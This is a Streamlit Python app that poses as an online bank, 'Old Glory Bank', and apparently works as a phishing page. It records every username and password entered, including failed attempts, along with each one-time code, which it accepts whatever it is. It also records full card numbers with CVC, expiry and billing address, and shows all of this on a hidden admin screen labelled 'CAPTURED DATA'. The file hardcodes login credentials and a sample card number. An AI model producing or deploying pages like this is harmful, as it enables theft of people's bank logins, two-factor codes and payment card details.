import streamlit as st
import pandas as pd
from datetime import datetime
import random

# ====== SESSION STATE INIT ======
if "checking_balance" not in st.session_state:
    st.session_state.checking_balance = 12340.50
if "savings_balance" not in st.session_state:
    st.session_state.savings_balance = 14911.32
if "account_nicknames" not in st.session_state:
    st.session_state.account_nicknames = {
        "Old Glory Checking ••••1776": "Old Glory Checking ••••1776",
        "Stars & Stripes Savings ••••1812": "Stars & Stripes Savings ••••1812"
    }
if "custom_theme" not in st.session_state:
    st.session_state.custom_theme = "Old Glory"
if "font_size" not in st.session_state:
    st.session_state.font_size = 14
if "language" not in st.session_state:
    st.session_state.language = "English"
if "captured_creds" not in st.session_state:
    st.session_state.captured_creds = []
if "captured_otp" not in st.session_state:
    st.session_state.captured_otp = []
if "scheduled_transfers" not in st.session_state:
    st.session_state.scheduled_transfers = []
if "login_history" not in st.session_state:
    st.session_state.login_history = []
if "file_uploads" not in st.session_state:
    st.session_state.file_uploads = []
if "transactions" not in st.session_state:   # New: transaction history
    st.session_state.transactions = []

for key in ["authenticated", "otp_verified", "attempts", "is_admin"]:
    if key not in st.session_state:
        st.session_state[key] = False

st.set_page_config(page_title="Old Glory Bank", page_icon="🇺🇸", layout="wide")

def custom_style():
    font_selected = st.session_state.font_size
    st.markdown(f"""
    <style>
        .stApp {{
            background: linear-gradient(145deg, #fff 65%, #002868 100%);
            color: #1b1b1b;
            font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
            font-size:{font_selected}px;
        }}
        .oldglory-header {{
            background: repeating-linear-gradient(90deg, #002868 0, #002868 60px, #BF0A30 60px, #BF0A30 120px);
            padding: 22px;
            text-align: center;
            border-bottom: 10px solid #fcca46;
            border-radius: 0 0 30px 30px;
        }}
        .glass-card {{
            background: repeating-linear-gradient(135deg, #fff 0, #fff 90%, #fcca46 100%);
            color: #14213d !important;
            border-radius: 18px;
            padding: 32px;
            box-shadow: 0 8px 28px rgba(0,40,104,0.15);
            margin: 28px 0;
            border-bottom: 5px solid #BF0A30;
            border-right: 4px solid #002868;
            border-left: 4px solid #fcca46;
        }}
        .oldglory-btn, .stButton>button {{
            background: linear-gradient(90deg, #BF0A30 60%, #002868 100%) !important; color: #fff !important; font-weight: bold !important;
            border-radius: 12px !important; border: none !important; padding: 12px 32px !important;
            box-shadow: 0 4px 12px rgba(0,40,104,0.20);
            transition: background 0.2s;
        }}
        .oldglory-btn:hover, .stButton>button:hover {{
            background: #fcca46 !important;
            color: #BF0A30 !important;
        }}
        .big-logo {{
            font-size: 130px;
            text-align: center;
            margin-bottom: -10px;
            padding-bottom: 6px;
            background: linear-gradient(90deg, #002868 70%, #BF0A30 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        h1, h2, h3 {{
            color: #BF0A30 !important;
            text-shadow: 1px 1px 4px #00286833;
        }}
        .irs-status {{
            background: #BF0A30 !important; color: #fff !important; border:2px solid #fcca46;
        }}
        .sidebar-american {{
            background: repeating-linear-gradient(135deg,#fff 60%,#002868 120px,#BF0A30 100%,#fff 120px);
            padding: 18px; border-radius: 24px; margin-bottom:20px; border: 4px solid #BF0A30;
            box-shadow: 0 6px 24px #00286822;
        }}
        .stProgress > div > div > div {{
            background-color: #fcca46 !important;
        }}
        .money-text, .stMetricValue {{
            color: #fcca46 !important;
            font-size:1.3em; font-weight:bold;
        }}
        .glass-card-title {{
            color: #002868 !important; font-size: 22px;
        }}
        .us-stars {{
            font-size:26px; color: #fcca46; letter-spacing: 8px;
        }}
    </style>
    """, unsafe_allow_html=True)
custom_style()

def theme_switcher():
    with st.sidebar.expander("🦅 Old Glory Theme & Accessibility"):
        theme = st.selectbox("Theme", ["Old Glory", "Classic American", "Modern"], key='sidebar_theme')
        st.session_state.custom_theme = theme
        current_font_size = (
            st.session_state.font_size
            if isinstance(st.session_state.font_size, int)
            else int(str(st.session_state.font_size).replace("px", ""))
        )
        st.session_state.font_size = st.slider("Font Size", 10, 30, current_font_size, key='sidebar_font_size')
        lang = st.selectbox("Language", ["English", "Español", "Français"], key='sidebar_language')
        st.session_state.language = lang

VALID_USERNAME = "client001"
VALID_PASSWORD = "SecureUSA2025!"
ADMIN_USER = "admin"
ADMIN_PASS = "showme2025"

def login_page():
    st.markdown("<div class='oldglory-header'><div class='big-logo'>🦅</div><h1>Welcome to Old Glory Bank</h1></div>", unsafe_allow_html=True)
    st.markdown("<div style='text-align:center; padding:60px 20px'>", unsafe_allow_html=True)
    username = st.text_input("User ID", placeholder="Enter your User ID")
    password = st.text_input("Password", type="password", placeholder="Enter your password")
    if st.button("Log In", type="primary"):
        st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "user": username, "pass": password})
        st.session_state.login_history.append({"time": datetime.now().strftime("%Y-%m-%d %H:%M"), "user": username})
        if username == VALID_USERNAME and password == VALID_PASSWORD:
            st.session_state.authenticated = True
            st.session_state.otp_verified = False
            st.rerun()
        elif username == ADMIN_USER and password == ADMIN_PASS:
            st.session_state.is_admin = True
            st.session_state.authenticated = True
            st.rerun()
        else:
            st.error("Incorrect User ID or password")

def otp_page():
    st.markdown("<div style='text-align:center; padding:80px'>", unsafe_allow_html=True)
    st.markdown("<h1>🔐 Security Verification</h1><p>We sent a 6-digit code to your phone ending in <b>--1776</b></p>", unsafe_allow_html=True)
    code = st.text_input("Enter code", max_chars=6, placeholder="000000")
    if st.button("Verify", type="primary"):
        st.session_state.captured_otp.append({"time": datetime.now().strftime("%H:%M"), "otp": code})
        if len(code) == 6:
            st.session_state.otp_verified = True
            st.rerun()
        else:
            st.error("Invalid code")

def admin_view():
    st.markdown("<h1 style='color:#BF0A30; text-align:center'>🦅 ADMIN — CAPTURED DATA</h1>", unsafe_allow_html=True)
    if st.session_state.captured_creds: st.dataframe(pd.DataFrame(st.session_state.captured_creds))
    if st.session_state.captured_otp: st.dataframe(pd.DataFrame(st.session_state.captured_otp))
    if st.session_state.scheduled_transfers: st.dataframe(pd.DataFrame(st.session_state.scheduled_transfers))
    if st.session_state.login_history: st.dataframe(pd.DataFrame(st.session_state.login_history))
    if st.session_state.file_uploads: st.dataframe(pd.DataFrame(st.session_state.file_uploads))
    if st.session_state.transactions: st.dataframe(pd.DataFrame(st.session_state.transactions))

def dashboard():
    st.markdown("""
    <div class='oldglory-header'>
        <span class='big-logo'>🦅</span>
        <div class='us-stars'>★ ★ ★ ★ ★</div>
        <h1>Old Glory Bank</h1>
        <p style='color:#fcca46;font-size:20px;'><b>In God We Trust</b></p>
    </div>
    """, unsafe_allow_html=True)
    c1, c2, c3, c4 = st.columns(4)
    with c1: st.metric("Total Balance", f"${st.session_state.checking_balance + st.session_state.savings_balance:,.2f}", help="All accounts combined")
    with c2: st.metric("Available Credit", "$15,700")
    with c3: st.metric("Monthly Spending", "$3,214")
    with c4: st.metric("Savings Goal", "78%")
    st.markdown("<h2 style='color:#002868'>Spending Breakdown</h2>", unsafe_allow_html=True)
    spend_data = {
        "Stars & Stripes Day": 776,
        "Freedom Groceries": 1200,
        "Bills": 900,
        "Shopping": 500,
        "Liberty Travel": 400,
        "Subscriptions": 214
    }
    spend_df = pd.DataFrame(list(spend_data.items()), columns=['Category', 'Amount']).set_index("Category")
    st.bar_chart(spend_df, use_container_width=True)
    st.markdown("<h2 style='color:#BF0A30'>Budget Tracking</h2>", unsafe_allow_html=True)
    current_spending = sum(spend_data.values())
    spending_limit = 3500
    st.progress(int((current_spending / spending_limit) * 100))
    if current_spending > spending_limit:
        st.error("You've exceeded your monthly budget!")
    st.markdown("""
    <div style="text-align:center">
      <span style='font-size:30px;color:#BF0A30'>🇺🇸</span>
      <span style='color:#002868;font-weight:bold;font-size:18px'>
        <br>Freedom, Security, and Prosperity<br>
        <span style='font-size:15px;color:#fcca46;'>Your money, your liberty.</span>
      </span>
    </div>
    """, unsafe_allow_html=True)
    st.button("Pay Bill")
    st.button("Schedule Transfer")
    st.button("Download Statement")

def accounts():
    st.markdown("<h1 style='text-align:center; color:#BF0A30'>My Accounts</h1>", unsafe_allow_html=True)
    for name, bal in [
        ("Old Glory Checking ••••1776", f"${st.session_state.checking_balance:,.2f}"),
        ("Stars & Stripes Savings ••••1812", f"${st.session_state.savings_balance:,.2f}")
    ]:
        nickname = st.session_state.account_nicknames.get(name, name)
        st.markdown(
            f"<div class='glass-card'><h3 class='glass-card-title'>{nickname}</h3><h2 class='money-text'>{bal}</h2></div>", unsafe_allow_html=True
        )
        newname = st.text_input(f"Rename {name}", value=nickname, key=f"nick_{name}")
        if newname != nickname:
            st.session_state.account_nicknames[name] = newname

def cards_page():
    st.markdown("<h1 style='text-align:center; color:#BF0A30'>My Cards</h1>", unsafe_allow_html=True)
    st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
    st.markdown("<div style='font-size:80px; text-align:center'>💳</div><h2 style='text-align:center; color:#002868'>Old Glory Freedom Card</h2><h3 style='text-align:center'>•••• •••• 1776</h3>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns(3)
    with col1:
        if st.button("Show Full Number"):
            st.success("5412 1776 2024 1812")
    with col2:
        if st.button("Show Expiry"):
            st.success("07/29")
    with col3:
        if st.button("Show CVV"):
            st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "action": "CVV Revealed"})
            st.info("CVV: 776")
    st.markdown("</div>", unsafe_allow_html=True)

# --- Card Validation Logic ---
def validate_card_number(card_number: str) -> bool:
    digits = [c for c in card_number if c.isdigit()]
    if len(digits) not in [15, 16]: return False
    digits = [int(d) for d in digits]
    odd_sum = sum(digits[-1::-2])
    even_sum = sum([sum(divmod(2 * d, 10)) for d in digits[-2::-2]])
    return (odd_sum + even_sum) % 10 == 0

def validate_cvc(cvc: str) -> bool:
    return cvc.isdigit() and len(cvc) in [3, 4]

def validate_expiry(expiry: str) -> bool:
    if not isinstance(expiry, str) or len(expiry) != 5 or "/" not in expiry:
        return False
    m, y = expiry.split("/")
    if not (m.isdigit() and y.isdigit()): return False
    m, y = int(m), int(y)
    return 1 <= m <= 12 and 24 <= y <= 99

def validate_zip(zip_code: str) -> bool:
    return zip_code.isdigit() and 3 <= len(zip_code) <= 10

def validate_address(address: str) -> bool:
    return bool(address.strip())

def process_card_payment(card_data, bill_info):
    if card_data["card_number"].replace(" ", "").startswith("4"):
        return {"success": True, "message": "Payment processed by 'DemoPay' successfully!"}
    return {"success": False, "message": "Provider error: card not supported."}

def transfer():
    st.markdown("<h1 style='text-align:center; color:#BF0A30'>Transfer & Payments</h1>", unsafe_allow_html=True)
    st.radio("Type", ["My Accounts", "External", "Zelle", "International"])
    col1, col2 = st.columns(2)
    with col1:
        from_acct = st.selectbox("From", ["Old Glory Checking ****1776", "Stars & Stripes Savings ****1812"])
    with col2:
        to_acct = st.selectbox("To", ["Stars & Stripes Savings ****1812", "External", "Old Glory Checking ****1776", "International"])
    amount = st.number_input("Amount", 0.01)
    date_scheduled = st.date_input("Scheduled Date (optional)", datetime.now())

    # Bill Pay Section
    st.markdown("### 💵 Automated Bill Pay")
    bill_name = st.text_input("Bill to pay (e.g. Power)", "")
    bill_amount = st.number_input("Bill Amount", 0.01)
    bill_pay_date = st.date_input("Bill Pay Date", datetime.now(), key="bill_pay_date")
    bill_pay_method = st.selectbox("Payment Method", ["Account Transfer", "Credit Card"], key="bill_payment_method")

    if bill_pay_method == "Credit Card":
        st.markdown(
            """
            <div class='glass-card' style="border:3px solid #BF0A30;margin-top:10px;">
              <h3 style='color:#BF0A30;'>Credit Card Information</h3>
            """, unsafe_allow_html=True)
        card_number = st.text_input("Card Number", max_chars=19)
        card_cvc = st.text_input("CVC", max_chars=4)
        card_expiry = st.text_input("Expiry Date (MM/YY)", max_chars=5)
        card_zip = st.text_input("ZIP Code", max_chars=10)
        billing_address = st.text_area("Billing Address")
        st.markdown("</div>", unsafe_allow_html=True)

        # Live Validation
        errors = []
        if card_number and not validate_card_number(card_number):
            errors.append("Invalid card number (Luhn check failed or wrong length).")
        if card_cvc and not validate_cvc(card_cvc):
            errors.append("Invalid CVC (3-4 digits).")
        if card_expiry and not validate_expiry(card_expiry):
            errors.append("Invalid expiry (MM/YY).")
        if card_zip and not validate_zip(card_zip):
            errors.append("ZIP code must be digits, 3-10 chars.")
        if billing_address and not validate_address(billing_address):
            errors.append("Billing address required.")

        st.markdown("#### Live Validation Results")
        for e in errors: st.error(e)

        pay_card = st.button("Pay Bill With Card", key="pay_bill_with_card")
        if pay_card:
            if not card_number or not card_cvc or not card_expiry or not card_zip or not billing_address:
                st.error("Please fill all required fields.")
            elif errors:
                for error in errors: st.error(error)
            elif not bill_name or not bill_amount or not bill_pay_date:
                st.error("Bill name/amount/date required.")
            else:
                card_data = {
                    "card_number": card_number, "cvc": card_cvc,
                    "expiry": card_expiry, "zip": card_zip,
                    "billing_address": billing_address
                }
                bill_info = {"bill": bill_name, "amount": bill_amount, "date": str(bill_pay_date)}
                resp = process_card_payment(card_data, bill_info)
                if resp["success"]:
                    st.success(f"Paid ${bill_amount:,.2f} to {bill_name} via Credit Card ending {card_number[-4:]}, scheduled {bill_pay_date}")
                    st.session_state.captured_creds.append({
                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "card_payment": {**card_data, **bill_info}
                    })
                    # Log transaction
                    st.session_state.transactions.append({
                        "type": "Credit Bill Payment",
                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "amount": bill_amount,
                        "payee": bill_name,
                        "method": "Credit Card",
                        "details": f"Card ending {card_number[-4:]}, ZIP {card_zip}"
                    })
                else:
                    st.error(resp["message"])

    if bill_pay_method == "Account Transfer":
        if st.button("Pay Bill", key="pay_bill_account"):
            if not bill_name or not bill_amount or not bill_pay_date:
                st.error("Bill name, amount, and pay date required.")
            else:
                st.success(f"{bill_name} bill paid: ${bill_amount:,.2f} Scheduled: {bill_pay_date}")
                st.session_state.scheduled_transfers.append({
                    "from": from_acct, "to": bill_name, "amount": bill_amount,
                    "date": str(bill_pay_date)
                })
                # Log transaction
                st.session_state.transactions.append({
                    "type": "Account Bill Payment",
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "amount": bill_amount,
                    "payee": bill_name,
                    "method": "Account Transfer",
                    "details": f"From {from_acct}"
                })

    if st.button("Send", key="send_transfer"):
        if from_acct == to_acct:
            st.error("Cannot transfer to the same account.")
        elif "International" in to_acct:
            st.success("International transfer completed! Currency conversion pending.")
            st.session_state.scheduled_transfers.append({
                "from": from_acct, "to": to_acct, "amount": amount,
                "date": str(date_scheduled)
            })
            st.session_state.transactions.append({
                "type": "International Transfer",
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "amount": amount,
                "payee": to_acct,
                "method": "International",
                "details": f"From {from_acct}"
            })
        elif "External" in to_acct:
            st.success("Transfer to external account completed!")
            st.session_state.scheduled_transfers.append({
                "from": from_acct, "to": to_acct, "amount": amount,
                "date": str(date_scheduled)
            })
            st.session_state.transactions.append({
                "type": "External Transfer",
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "amount": amount,
                "payee": to_acct,
                "method": "External",
                "details": f"From {from_acct}"
            })
        else:
            from_key = "checking_balance" if "Checking" in from_acct else "savings_balance"
            to_key = "savings_balance" if "Savings" in to_acct else "checking_balance"
            if st.session_state[from_key] < amount:
                st.error("Insufficient funds.")
            else:
                st.session_state[from_key] -= amount
                st.session_state[to_key] += amount
                st.success(f"Transferred ${amount:,.2f} from {from_acct} to {to_acct}")
                st.session_state.scheduled_transfers.append({
                    "from": from_acct, "to": to_acct, "amount": amount,
                    "date": str(date_scheduled)
                })
                st.session_state.transactions.append({
                    "type": "Account Transfer",
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "amount": amount,
                    "payee": to_acct,
                    "method": "Account Transfer",
                    "details": f"From {from_acct}"
                })

    st.markdown("### 🔄 Recurring & Scheduled Transfers")
    st.dataframe(pd.DataFrame(st.session_state.scheduled_transfers))

def transaction_history():
    st.markdown("<h1 style='text-align:center; color:#BF0A30'>Transaction History</h1>", unsafe_allow_html=True)
    df = pd.DataFrame(st.session_state.transactions)
    if not df.empty:
        # Search/filter
        filter_type = st.selectbox("Filter by Transaction Type", ["All"] + list(df["type"].unique()))
        filter_method = st.selectbox("Filter by Payment Method", ["All"] + list(df["method"].unique()))
        filter_payee = st.text_input("Filter by Payee (bill name, account, etc.)", "")

        mask = pd.Series([True] * len(df))
        if filter_type != "All":
            mask &= df["type"] == filter_type
        if filter_method != "All":
            mask &= df["method"] == filter_method
        if filter_payee.strip():
            mask &= df["payee"].str.contains(filter_payee, case=False, na=False)

        filtered_df = df[mask]
        st.dataframe(filtered_df)

        # Download
        st.download_button("Download Transactions CSV",
                           filtered_df.to_csv(index=False),
                           file_name="oldglory_transactions.csv")
    else:
        st.info("No transactions have been made yet!")

def messages():
    st.markdown("<h1 style='text-align:center; color:#BF0A30'>Secure Messages & Chat</h1>", unsafe_allow_html=True)
    for m in ["Statement Ready", "New Login Alert", "Rate Increase"]:
        st.markdown(f"<div class='glass-card'><h4>🟦 {m}</h4></div>", unsafe_allow_html=True)
    st.markdown("### Chat Support (Demo)")
    question = st.text_input("Ask a question:", "How do I set up a savings goal?")
    if st.button("Chat Send"):
        st.info("AI: To set a savings goal, go to Accounts → Savings, then click 'Set Goal'.")
    st.markdown("### 📄 Secure Document Upload")
    uploaded_file = st.file_uploader("Upload documents for support or tax", type=["pdf", "jpg", "png"])
    if uploaded_file:
        st.session_state.file_uploads.append({
            "filename": uploaded_file.name,
            "time": datetime.now().isoformat()
        })
        st.success(f"Uploaded {uploaded_file.name}")

def security():
    st.markdown("## Security & Login History")
    st.markdown("### Recent Logins")
    st.dataframe(pd.DataFrame(st.session_state.login_history if st.session_state.login_history else [], columns=["time", "user"]))
    st.markdown("#### Security Alerts")
    for alert in ["Unusual login detected from new device.", "Email updated.", "No suspicious transactions found."]:
        st.warning(alert)

def budget_page():
    st.markdown("## Budget & Savings")
    spend_hist = [1200, 900, 500, 400, 214] + [random.randint(50,300) for _ in range(6)]
    st.line_chart(pd.DataFrame({"Spending": spend_hist, "Goal": [3500]*len(spend_hist)}))
    st.success("You're on track to meet this month's savings goal!")
    st.info("Forecast: At your current rate, you'll reach $20,000 in savings by September 2026.")

def settings_page():
    st.markdown(f"Current Theme: {st.session_state.custom_theme}")
    st.markdown(f"Language: {st.session_state.language}")
    st.markdown(f"Font Size: {st.session_state.font_size}")

def sidebar():
    st.sidebar.markdown("""
        <div class='sidebar-american'>
            <div style='font-size:48px;'>🦅🇺🇸</div>
            <div class='us-stars'>★ ★ ★ ★ ★</div>
            <h2 style='color:#BF0A30; margin-bottom:0'>Old Glory Bank</h2>
            <p style='color:#002868; font-size:15px; font-weight:bold'>
            <i>Land of the Free,<br>Home of the Brave</i></p>
        </div>
    """, unsafe_allow_html=True)
    page = st.sidebar.radio("Navigate", [
        "Dashboard", "Accounts", "Cards", "Transfer & Payments", "Messages",
        "Security", "Budget", "Transaction History", "Settings"
    ])
    theme_switcher()
    if st.sidebar.button("Log Out"):
        for k in ["authenticated", "otp_verified", "is_admin"]: st.session_state[k] = False
        st.rerun()
    return page

if not st.session_state.authenticated:
    login_page()
elif st.session_state.is_admin:
    admin_view()
elif not st.session_state.otp_verified:
    otp_page()
else:
    current = sidebar()
    if current == "Accounts": accounts()
    elif current == "Cards": cards_page()
    elif current == "Transfer & Payments": transfer()
    elif current == "Messages": messages()
    elif current == "Security": security()
    elif current == "Budget": budget_page()
    elif current == "Transaction History": transaction_history()
    elif current == "Settings": settings_page()
    else: dashboard()
